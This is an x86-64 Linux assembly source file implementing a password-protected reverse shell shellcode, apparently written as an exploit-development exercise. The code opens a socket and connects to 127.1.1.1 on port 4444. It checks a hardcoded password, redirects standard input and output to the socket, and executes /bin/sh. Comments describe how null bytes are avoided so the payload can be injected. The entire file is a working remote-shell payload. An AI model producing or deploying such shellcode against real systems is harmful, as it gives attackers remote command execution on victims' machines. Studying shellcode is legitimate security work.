global _start

section .text

_start:

    ; Syscall socket()
    xor rax, rax
    add al, 0x29   ; Syscall Socket (41)
    xor rdi, rdi
    add rdi, 0x2    ; 2 - AF_INET
    xor rsi, rsi
    inc rsi         ; 1 - SOCK_STREAM
    xor rdx, rdx    ; 0 - INADDR_ANY
    syscall

    mov r15, rax    ; Get Socket handle into r15 and preserve it for later
    
    ; Syscall connect()
    xor rax, rax
    push 0x0101017f     ; 127.1.1.1 -> 127.0.0.1 would generate NULLs
    push word 0x5C11    ; Port 4444
    push word 0x02      ; AF_INET = 2 
    mov rdi, r15        ; Socket Handle
    mov rsi, rsp        ; struct sockaddr
    add al, 0x2a        ; Syscall Connect (42)
    add rdx, 0x10       ; address lenght 16
    syscall

    ; Syscall Read() - Password validation
    xor rax, rax            ; Syscall Read (0)
    mov rdi, r15            ; rdi = Socket handle
    sub rsp, 0x1e           ; Stack buffer - Space allocation
    mov rsi, rsp            ; Buf addr to rsi
    mov dl, 0x1e            ; nr of Bytes to read
    syscall

    mov rax, 0x64726f7773736170 ; hardcoded password in little endian "drowssap"  
    mov rdi, rsi    ; password
    scasq		        ; compare rax with rdi
    jne exit		    ; if is password incorrect jump to exit


    ; Syscall dup2()
    xor rsi, rsi
    add rsi, 0x02   ; rsi = counter with fd
    mov rdi, r15	  ; Pass the Socket Handle back to rdi

    loop:
        xor rax, rax
        add al, 0x21    ; Syscall Dup2 (33)
        syscall
        dec rsi         ; decrement fd (stdin, stdout, stderr)
        jns loop

    ; Syscall execve()
    xor rax, rax
    add al, 0x3b        ; Syscall Execve (59)
    cdq                    
    mov rbx, 0x0168732f6e69622f ; String "hs/nib/" padded with 01 to avoid null byte

    rol rbx, 0x08       ; Rotates Left 1 byte: 01 to the least significant byte
    dec rbx             ; Dec rbx by 1 (01 becomes 00)
    ror rbx, 0x08       ; Rotate Right 1 byte: rbx becomes 0x0068732f6e69622f
                        ; without using any null byte

    push rbx
    mov rdi, rsp        ; rsi -> rdi -> path = /bin/sh,0x0
    push rdx            ; rdx = 0
    push rdi
    mov rsi, rsp
    syscall
    
    exit:
    ; Syscall close()
    xor rax, rax
    add al, 0x03        ; Syscall Close (3)
    syscall

    ; Syscall exit()
    xor rax, rax
    add al, 0x3C        ; Syscall Exit(60)
    syscall
